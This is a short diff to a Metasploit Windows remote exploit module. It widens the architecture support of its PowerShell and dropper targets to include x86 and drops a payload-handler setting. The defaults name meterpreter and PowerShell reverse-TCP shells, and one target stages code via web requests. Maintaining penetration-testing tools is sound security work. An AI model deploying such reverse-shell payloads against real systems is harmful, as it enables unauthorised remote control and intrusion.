@@ -65,14 +65,14 @@ class MetasploitModule < Msf::Exploit::Remote
           'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
         },
         'Platform' => ['windows'],
-        'Arch' => [ARCH_CMD, ARCH_X64],
+        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
         'Privileged' => true,
         'Targets' => [
           [
             'Windows Powershell',
             {
               'Platform' => 'windows',
-              'Arch' => [ARCH_X64],
+              'Arch' => [ARCH_X64, ARCH_X86],
               'Type' => :windows_powershell,
               'DefaultOptions' => {
                 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Exploit::Remote
             'Windows Dropper',
             {
               'Platform' => 'windows',
-              'Arch' => [ARCH_X64],
+              'Arch' => [ARCH_X64, ARCH_X86],
               'Type' => :windows_dropper,
               'CmdStagerFlavor' => %i[psh_invokewebrequest],
               'DefaultOptions' => {
@@ -99,7 +99,6 @@ class MetasploitModule < Msf::Exploit::Remote
               'Arch' => [ARCH_CMD],
               'Type' => :windows_command,
               'DefaultOptions' => {
-                'DisablePayloadHandler' => true,
                 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
               }
             }
